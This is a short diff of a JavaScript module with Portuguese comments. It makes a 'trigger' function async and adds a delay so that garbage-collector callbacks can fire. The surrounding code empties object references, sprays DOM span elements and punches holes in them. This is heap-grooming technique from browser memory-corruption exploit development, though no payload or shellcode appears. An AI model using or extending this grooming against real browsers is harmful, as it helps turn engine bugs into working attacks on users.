@@ -31,13 +31,15 @@ export default {
         }
     },
 
-    trigger: function() {
-        // O GATILHO: Apagamos todas as referências para forçar um pânico no GC
+    // FIX: Transformado em async para permitir o await
+    trigger: async function() {
         this.targets = null;
         
-        // Fragmentamos a memória brutalmente para atrasar a fase de limpeza (Sweeping)
         let trash = Groomer.sprayDOM('span', 2000);
         Groomer.punchHoles(trash, 2);
+
+        // Dá tempo para o GC assíncrono disparar os callbacks no registro
+        await new Promise(r => setTimeout(r, 50));
     },
 
     probe: [
